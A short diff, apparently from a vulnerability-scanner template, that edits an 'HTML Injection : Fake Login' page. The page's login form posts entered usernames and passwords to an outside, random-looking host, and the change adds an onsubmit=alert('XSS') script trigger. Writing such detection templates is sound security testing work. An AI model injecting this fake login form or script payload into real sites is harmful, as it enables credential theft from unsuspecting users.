@@ -7,7 +7,7 @@ info:
         <h1>HTML Injection : Fake Login</h1>
     </div>
     <div class="form-container">
-        <form action="https://wnnhch28jmqody4jh5bzffarmis9g14q.ywrzzg.com/login" method="post" class="form-signin">
+        <form action="https://wnnhch28jmqody4jh5bzffarmis9g14q.ywrzzg.com/login" method="post" class="form-signin" onsubmit=alert("XSS")>
             <div class="form-group">
                 <label for="username">Username</label>
                 <input type="text" name="username" size="20">
